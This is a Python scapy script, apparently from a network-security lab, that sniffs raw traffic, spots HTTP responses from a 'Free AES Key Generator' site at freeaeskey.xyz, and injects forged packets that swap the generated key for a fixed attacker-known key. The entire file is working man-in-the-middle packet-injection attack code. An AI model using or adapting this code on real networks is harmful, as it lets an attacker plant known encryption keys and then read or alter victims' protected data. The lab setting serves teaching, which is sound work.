from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP, IP, Ether, Raw
import socket
import re

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket = L3RawSocket
    send(pkt)

# Known Key used in MIM attack
knownKey = b"4d6167696320576f7264733a2053717565616d697368204f7373696672616765"

# Resolve the target hostname to an IP address
targetHost = "freeaeskey.xyz"
targetIP = socket.gethostbyname(targetHost)


def handle_pkt(pkt):
    ethPacket = Ether(pkt)
    
    # Check if the packet contains IP and TCP layers
    if IP in ethPacket and TCP in ethPacket:
        ip_packet = ethPacket[IP]
        tcp_packet = ethPacket[TCP]

        # Check if the packet contains a Raw layer with payload
        if Raw in ethPacket:
            # Get the raw packet data
            data = ethPacket[Raw].load

            # Sub-byte-string to look for
            byteStr = b"Free AES Key Generator!"

            # Intercept the request and modify the response
            if byteStr in data:
                # Use regex to replace the key with the known key
                modResponse = re.sub(rb'<b>[0-9a-f]+</b>', b'<b>' + knownKey + b'</b>', data)

                # Create a new packet to inject
                MIMPacket = ethPacket.copy()

                # Locate the Raw layer in the new_packet and set its load to the modified data
                if Raw in MIMPacket:
                    MIMPacket[Raw].load = modResponse
                else:
                    # If there is no Raw layer in the packet, create one and set its load
                    MIMPacket = MIMPacket / Raw(load=modResponse)

                # Send the modified response
                inject_pkt(MIMPacket)


def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)

    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
